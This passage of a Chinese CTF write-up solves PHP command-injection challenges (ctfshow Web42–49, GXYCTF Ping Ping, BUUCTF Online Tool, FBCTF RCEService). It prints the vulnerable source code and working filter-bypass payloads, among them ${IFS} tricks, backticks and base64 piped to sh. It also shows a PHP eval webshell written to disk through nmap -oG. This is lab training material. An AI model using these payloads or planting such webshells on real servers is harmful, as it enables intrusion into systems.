<p>所以payload1:  ?c&#x3D;ls;ls然后?c&#x3D;tac flag.php;1</p>
<p>ps:这里的分号相当于分隔号，也就是输入两个指令，第二个指令随便什么都可以，反正不会有回显,<strong>另外这里的分号我们可以替换成%0a也就是换行符，这里也可以当做分号使用，原理一样</strong></p>
<p>所以 payload2: ?c&#x3D;tac flag.php%0a</p>
<p>还有一种方法就是使用&amp;&amp;和||来绕过，其中&amp;&amp;要进行URL编码后再传入进去，因为是在URL内传输的,<strong>||  前面错了执行后面的,前面的对了就不执行</strong></p>
<p>                            <strong>&amp;&amp;前面为真执行后面的，前面的错了就不执行后面的</strong></p>
<p>这里这两个东西和分号的作用类似</p>
<p>Payload3： ?c&#x3D;tac flag.php&amp;&amp;或者?c&#x3D;tac flag.php||</p>
<h3 id="Web43（类型同上）"><a href="#Web43（类型同上）" class="headerlink" title="Web43（类型同上）"></a>Web43（类型同上）</h3><p>源码和上一题一样，多ban掉了cat和;</p>
<p>我们只要用tac和%0a即可，思路就这样</p>
<h3 id="Web44（类型同上）"><a href="#Web44（类型同上）" class="headerlink" title="Web44（类型同上）"></a>Web44（类型同上）</h3><p>比web43多ban掉了个flag，我们用通配符*或者?等等即可</p>
<p>payload：?c&#x3D;tac fla*%0a</p>
<h3 id="Web45（类型同上）"><a href="#Web45（类型同上）" class="headerlink" title="Web45（类型同上）"></a>Web45（类型同上）</h3><p>比web44多ban了个空格，我们空格绕过用%09或者${IFS}就好了就好了</p>
<h3 id="Web46（类型同上）"><a href="#Web46（类型同上）" class="headerlink" title="Web46（类型同上）"></a>Web46（类型同上）</h3><p>这道题多ban掉了数字0-9和$还有*号</p>
<p>这里我们用前面提到的&amp;&amp;和||来代替；</p>
<p>原理类似，空格就用URL编码去绕过%09可行</p>
<p>所以payload:    ?c&#x3D;tac%09fla?.php||</p>
<p>payload2:?c&#x3D;c”a”t%09fla??php||</p>
<h3 id="Web47（类型同上）"><a href="#Web47（类型同上）" class="headerlink" title="Web47（类型同上）"></a>Web47（类型同上）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 21:59:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法万变不离其宗，多ban了一些输出的东西而已</p>
<p>payload:  ?c&#x3D;tac%09fla’’g.php||<br>这里要编码是因为’在URL编码有特殊</p>
<h3 id="Web48（类型同上）"><a href="#Web48（类型同上）" class="headerlink" title="Web48（类型同上）"></a>Web48（类型同上）</h3><p>与Web47一模一样</p>
<h3 id="Web49（类型同上）"><a href="#Web49（类型同上）" class="headerlink" title="Web49（类型同上）"></a>Web49（类型同上）</h3><p>同上，payload：?c&#x3D;tac%09fla?.php||</p>
<h3 id="ACTF2020-新生赛-Exec-基础的命令执行"><a href="#ACTF2020-新生赛-Exec-基础的命令执行" class="headerlink" title="ACTF2020 新生赛]Exec (基础的命令执行)"></a>ACTF2020 新生赛]Exec (基础的命令执行)</h3><p>进入后页面如下，猜测指令内容为ping ip<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349361853-8991e60a-867e-4068-9cce-0e9979358183.png#averageHue=%23fdfdfd&clientId=u52f2ed63-d88c-4&from=paste&height=582&id=u1dc6de25&name=image.png&originHeight=728&originWidth=1084&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24961&status=done&style=none&taskId=u6ecdbbfc-35f1-43c0-b8a9-f674c52f779&title=&width=867.2" alt="image.png"><br>我们首先尝试一下分隔符执行ls，首先输入1;ls,出现了index.php，但是很显然这并不是我们想要的文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349369000-4b593a00-d379-4541-bb56-2ccaee04bc64.png#averageHue=%23fbfbfb&clientId=u52f2ed63-d88c-4&from=paste&height=318&id=u5082b9e5&name=image.png&originHeight=398&originWidth=1190&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30857&status=done&style=none&taskId=u8dea08be-362d-4ae0-9e05-2d4bc459363&title=&width=952" alt="image.png"></p>
<p>所以接下来我们用命令<code>cd ../</code>来返回上一级目录，输入<code>1;cd ../;ls</code>一层层查看，第一次结果如下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349378941-ecec8fde-48aa-46df-ab21-8d5e469f9d27.png#averageHue=%23fafaf9&clientId=u52f2ed63-d88c-4&from=paste&height=349&id=uafec24e2&name=image.png&originHeight=436&originWidth=840&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36973&status=done&style=none&taskId=u0e43f130-8fe4-497a-8cab-1a762b0fe1c&title=&width=672" alt="image.png"><br>直到输入<code>1;cd ../../../;ls</code>发现了flag</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349387544-5b2cbb19-4da9-4d5d-8ad6-69b6b92541f9.png#averageHue=%23f7f7f7&clientId=u52f2ed63-d88c-4&from=paste&height=698&id=ue885ed50&name=image.png&originHeight=873&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60680&status=done&style=none&taskId=uf22671eb-4c3f-48ef-8e41-32fb35861ea&title=&width=951.2" alt="image.png"></p>
<p>这时我们就payload: 1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag,得到最终答案</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349392600-d32a4c75-d086-4d82-a9af-d10ceab5ef18.png#averageHue=%23f9f9f9&clientId=u52f2ed63-d88c-4&from=paste&height=369&id=ua9511a64&name=image.png&originHeight=461&originWidth=792&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49045&status=done&style=none&taskId=uf049454f-5919-4d96-8663-161b69d52ce&title=&width=633.6" alt="image.png"></p>
<h3 id="GXYCTF2019-Ping-Ping-一系列绕过）"><a href="#GXYCTF2019-Ping-Ping-一系列绕过）" class="headerlink" title="[GXYCTF2019]Ping Ping(一系列绕过）"></a>[GXYCTF2019]Ping Ping(一系列绕过）</h3><p>进入后页面如下，显然是要我们在url是要我们在url上进行输入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349403079-bb6a3672-9432-4fbd-840c-d952e0f8e8ba.png#averageHue=%23dacab7&clientId=u52f2ed63-d88c-4&from=paste&height=384&id=uef665134&name=image.png&originHeight=480&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60461&status=done&style=none&taskId=ued4f703d-05b8-4079-9d42-eb38cd09ce9&title=&width=946.4" alt="image.png"><br>尝试输入?ip&#x3D;1;ls后发现了flag.php和index.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349410481-135ff8c1-ea68-4101-8564-e873969c94a1.png#averageHue=%23f7f7f7&clientId=u52f2ed63-d88c-4&from=paste&height=424&id=uf445a791&name=image.png&originHeight=530&originWidth=1179&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72214&status=done&style=none&taskId=u5c69a6fa-bbcb-423e-ae3f-363fe267717&title=&width=943.2" alt="image.png"><br>再度尝试读取，他FXck我的空格，如此不礼貌，那我们就不用空格输入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349417748-d4171253-14e8-42a7-a22b-815d28ab99fd.png#averageHue=%23b7a48d&clientId=u52f2ed63-d88c-4&from=paste&height=466&id=u84de1216&name=image.png&originHeight=583&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86059&status=done&style=none&taskId=ud52ef721-4825-4691-a250-f015f3831b5&title=&width=994.4" alt="image.png"><br>嗯很好，这次我们用,代替空格后他又骂我们flag，说明过滤了flag，所以我们试试别的</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349434743-6f6f2e69-ffa3-4cd9-8ab6-af21ac8f030d.png#averageHue=%23f8f8f7&clientId=u52f2ed63-d88c-4&from=paste&height=426&id=udaab8fc8&name=image.png&originHeight=533&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65831&status=done&style=none&taskId=u84cdd032-47fd-42cd-b5ac-b8cbe42f1f8&title=&width=876.8" alt="image.png"></p>
<p>东西都让你给fxck完了呗就是，经过其他的尝试发现ban了很多东西，通配符也ban完了，空格里带百分号的也ban掉了，只能用$IFS$1这一类的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349497233-1c543be0-9a8f-4df9-ae92-24223da83ce8.png#averageHue=%23c0aa8e&clientId=u52f2ed63-d88c-4&from=paste&height=474&id=u98be9806&name=image.png&originHeight=592&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76461&status=done&style=none&taskId=u9ddb1fb7-741f-4a30-ac28-068b81a5415&title=&width=940.8" alt="image.png"></p>
<p>然后我们payload：?ip&#x3D;1;tac$IFS$1index.php，发现了源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从中我们可以看出他ban了很多字符，这题我发现有很多题解</p>
<p>payload1：?ip&#x3D;1;a&#x3D;g;cat$IFS$1fla$a.php</p>
<p><strong>我们来分析一下，首先shell_exec()函数是通过shell的环境来执行命令，在shell里面变量赋值是直接</strong><code>**变量名=值**</code><strong>这样的，如a&#x3D;g，payload1内就是用了这种方法，增添一个变量a赋值g，来构造flag.</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349586634-4d96d9b6-db5e-4c2c-8343-eeef241a5492.png#averageHue=%23ddb09a&clientId=u52f2ed63-d88c-4&from=paste&height=392&id=u68ecf9a7&name=image.png&originHeight=490&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74279&status=done&style=none&taskId=u4cdf841b-13a2-4665-b412-35700983723&title=&width=720" alt="image.png"></p>
<p>payload2：?ip&#x3D;1;cat$IFS$1<code>ls</code></p>
<p><strong>linux系统内会先将反引号内的指令先运行，所以这个payload内先运行ls得到了index.php和flag.php，然后在cat这两个文件，所以最后答案是这两个源文件的内容</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349604129-262ee6ab-6c88-478f-8826-4ce80efc9324.png#averageHue=%23fafafa&clientId=u52f2ed63-d88c-4&from=paste&height=544&id=u4ed138c8&name=image.png&originHeight=680&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139591&status=done&style=none&taskId=u1e4834c7-0af8-48a3-9aac-f809aeadecc&title=&width=964.8" alt="image.png"></p>
<p>payload3: ?ip&#x3D;1;echo$IFS$1ZWNobyBgY2F0IGZsYWcucGhwYA&#x3D;&#x3D;|base64 -d|sh</p>
<p><strong>首先用echo进行了base64传输加密，之后再用sh执行这个命令，base64编码的内容是</strong><code>**cat flag.php**</code><strong>照样得出答案</strong></p>
<h3 id="BUUCTF-2018-Online-Tool（escapeshellcmd和escapeshellarg）"><a href="#BUUCTF-2018-Online-Tool（escapeshellcmd和escapeshellarg）" class="headerlink" title="[BUUCTF 2018]Online Tool（escapeshellcmd和escapeshellarg）"></a>[BUUCTF 2018]Online Tool（escapeshellcmd和escapeshellarg）</h3><p>进入后，代码如下！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//全体目光向我看齐，以上这一段是废话</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);     <span class="comment">//重点</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbo	x &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);<span class="comment">//最后肯定要在这头陀的执行一些命令撒</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>出于对未知事物的好奇，我偷偷摸摸的去查了一下$_SERVER到底是个什么鸟东西，以下是百度百科</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%24_SERVER/4897514">$_SERVER</a> 是一个包含了诸如头信息(<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/header/688992">header</a>)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349641304-d95dd3a3-a95e-4dd2-94ef-fed1d5e2ea61.png#averageHue=%23f9f8f7&clientId=u52f2ed63-d88c-4&from=paste&height=724&id=ufce68691&name=image.png&originHeight=905&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=394129&status=done&style=none&taskId=uf53771c7-0ba6-431d-9db8-74387b092b0&title=&width=820" alt="image.png"><br>escapeshellcmd：<br>escapeshellarg：</p>
<p>怎么样是不是一点用都没有，好进入正题，这里考的是escapeshellarg和escapeshellcmd在一起会摩擦出什么样子的火花，可以参考以下文献</p>
<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">http://www.lmxspace.com/2018/07/16/谈谈escapeshellarg参数绕过和注入的问题/</a></p>
<p>简单的举个例子：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349932705-e54904c2-856b-4571-bcbd-ededf4bd3365.png#averageHue=%23222426&clientId=u52f2ed63-d88c-4&from=paste&height=746&id=ucad1702f&name=image.png&originHeight=933&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=166027&status=done&style=none&taskId=uc9e389b2-fd95-4781-8964-6f28ddb695a&title=&width=947.2" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663349938664-7b45085c-85d3-46e0-962a-88f04f92cad9.png#averageHue=%23fefefe&clientId=u52f2ed63-d88c-4&from=paste&height=224&id=u9d2e7aed&name=image.png&originHeight=280&originWidth=1148&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49660&status=done&style=none&taskId=uc1f8ce9e-4dce-4f87-a8dc-65451cf1aa1&title=&width=918.4" alt="image.png"></p>
<p>以上例子可以知道这两个函数存在严重的安全漏洞，可以让我们执行命令，他会把语句分开达到意外的效果</p>
<p>接下来引入一些概念知识</p>
<blockquote>
<ul>
<li>namp -PS 127.0.0.1</li>
<li>namp -PS ‘’ 127.0.0.1</li>
<li>nmap -PS ’ “ “ ’ 127.0.0.1 “ “<br>引号闭合后，加上这些，无影响</li>
<li>namp  -oG 1.php<br>可以写入一个文件</li>
<li>namp nmap &lt;?php phpinfo();&gt; -oG 1.php\’<br>会写成1.php‘ 而不是 1.php</li>
</ul>
</blockquote>
<p>接下里的payload就好构造了，nmap有一个参数-oG可以实现将命令和结果写到文件<br>所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag<br>所以我们的payload:?host&#x3D;’ <?php @eval($_POST["hack"]);?>-oG 1.php ‘</p>
<p>payload中的@是错误不报告的意思</p>
<p>———————————————————-<strong>payload 一定要加空格</strong>——————————————————————————————</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">正确的样式：</span><br><span class="line">&#x27; &lt;?php @eval($_POST[&quot;mayi&quot;]);?&gt; -oG mayi.php &#x27;</span><br><span class="line"></span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;\&#x27;&#x27; &lt;?php @eval($_POST[&quot;mayi&quot;]);?&gt; -oG mayi.php&#x27; \&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;\\&#x27;&#x27; \&lt;\?php @eval($_POST[&quot;mayi&quot;])\;\?\&gt; -oG mayi.php&#x27; \\&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># 等价于  \\ &lt;\?php @eval($_POST[&quot;mayi&quot;])\;\?\&gt; -oG mayi.php \\</span><br><span class="line"></span><br><span class="line"># 根据解析规则</span><br><span class="line"># 等价于  \\ &lt;\?php @eval($_POST[&quot;mayi&quot;])\;\?\&gt; -oG mayi.php</span><br><span class="line"># 写入后  &lt;?php @eval($_POST[&quot;mayi&quot;]);?&gt; -oG mayi.php</span><br><span class="line">——————————————————————————————————————————</span><br><span class="line">但是如果你的payload为：</span><br><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;mayi&quot;]);?&gt; -oG mayi.php&#x27;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;\\&#x27;&#x27; \&lt;\?php @eval($_POST[&quot;mayi&quot;])\;\?\&gt; -oG mayi.php&#x27;\\&#x27;&#x27;&#x27;</span><br><span class="line">&gt;&gt;&gt; &lt;?php @eval($_POST[&quot;mayi&quot;]);?&gt; -oG mayi.php\\</span><br><span class="line"># 这样是不会被认为是php文件的。</span><br><span class="line">#所以说必须后面要有 ‘ 而且前面要有空格哟。</span><br></pre></td></tr></table></figure>

<p>上传进去后用蚁剑去连接就可以得到答案<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350688085-5ec21989-0fd2-44a7-8c95-902fa334fcf9.png#averageHue=%23f4f4f4&clientId=u52f2ed63-d88c-4&from=paste&height=502&id=u7211eef3&name=image.png&originHeight=628&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68308&status=done&style=none&taskId=u1811caa3-0ce6-4a43-861d-2946defc6b5&title=&width=784" alt="image.png"></p>
<p>格式是url&#x2F;编码地址&#x2F;1.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350700565-17cffa63-e5e5-4203-ada1-2a2328baef05.png#averageHue=%23f8f7f5&clientId=u52f2ed63-d88c-4&from=paste&height=86&id=u22128125&name=image.png&originHeight=108&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75883&status=done&style=none&taskId=u2946518e-1b15-4dc4-a1be-33f962a9ac3&title=&width=975.2" alt="image.png"></p>
<p>密码就是我们POST里面的1，然后进去找到答案，编码地址就是<strong>sandbox后面那一串</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350708948-6e66d008-e9fc-4fd8-bf40-97dbbebfd8a0.png#averageHue=%23f9f9f9&clientId=u52f2ed63-d88c-4&from=paste&height=645&id=u144fc1ab&name=image.png&originHeight=806&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66711&status=done&style=none&taskId=uabaaebf2-ed34-46a0-a199-50c556ad8fc&title=&width=953.6" alt="image.png"></p>
<p>payload2：?host<code>=</code>‘  -oG test.php ‘</p>
<p>然后直接访问URL&#x2F;给的编码地址&#x2F;test.php就可以看到了</p>
<h3 id="FBCTF2019-RCEService（环境-0a绕过的RCE）"><a href="#FBCTF2019-RCEService（环境-0a绕过的RCE）" class="headerlink" title="[FBCTF2019]RCEService（环境+%0a绕过的RCE）"></a>[FBCTF2019]RCEService（环境+%0a绕过的RCE）</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350785473-f2d8234e-f72f-4ed9-9820-2d9641403f71.png#averageHue=%23f8f7f7&clientId=u52f2ed63-d88c-4&from=paste&height=306&id=udd64ac38&name=image.png&originHeight=382&originWidth=1162&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72560&status=done&style=none&taskId=u8e55aa02-6c94-4ef9-97f5-520f7ce5e43&title=&width=929.6" alt="image.png"></p>
<p>进入后页面如图所示，根据提示是要我们用JSON的格式输入一个东西<br>所谓的JSON是什么呢，如下图，简单地说就是{“变量名”：“值”}</p>
<p><code>json_encode</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350793657-f1e09ded-f710-4aa6-84d0-de89e03d9e74.png#averageHue=%23f9f9f9&clientId=u52f2ed63-d88c-4&from=paste&height=337&id=ud209a3d6&name=image.png&originHeight=421&originWidth=1058&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62111&status=done&style=none&taskId=u8ad1bea6-6222-4fb5-83b6-09607299e82&title=&width=846.4" alt="image.png"></p>
<p><code>json_decode</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350801815-ad168df4-eac4-4be8-9ca7-eee31b24d2cf.png#averageHue=%23fdfcfc&clientId=u52f2ed63-d88c-4&from=paste&height=774&id=u3a47470e&name=image.png&originHeight=968&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114003&status=done&style=none&taskId=ucfc78a43-dbd2-413e-bae6-85d093c80e5&title=&width=928" alt="image.png"></p>
<p>我们打开源代码看看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350811321-1342b7df-ba49-41e1-bf14-6b86b63bac8f.png#averageHue=%23fbfbfb&clientId=u52f2ed63-d88c-4&from=paste&height=236&id=u37000150&name=image.png&originHeight=295&originWidth=464&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13844&status=done&style=none&taskId=u252b3463-7a24-47ad-b5e4-d23b366f207&title=&width=371.2" alt="image.png"><br>look what we find,我们看到有个cmd，那我们就照着提示往下走，先输入{“cmd”:”ls”}得到了以下结果</p>
<p>我们发现了index.php，我尝试了用cat访问，但是无效，大概了ban了罢</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663350829332-a19a67ca-603e-4cc3-92d4-d9b22e5de580.png#averageHue=%23f6f5f5&clientId=u52f2ed63-d88c-4&from=paste&height=285&id=u66bf619b&name=image.png&originHeight=356&originWidth=687&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40963&status=done&style=none&taskId=u86bbda8f-4229-45c0-9a4d-9daef76df15&title=&width=549.6" alt="image.png"></p>
<p>后来去网上看了一下，发现这题目比赛上是给了一段源代码的，如下</p>
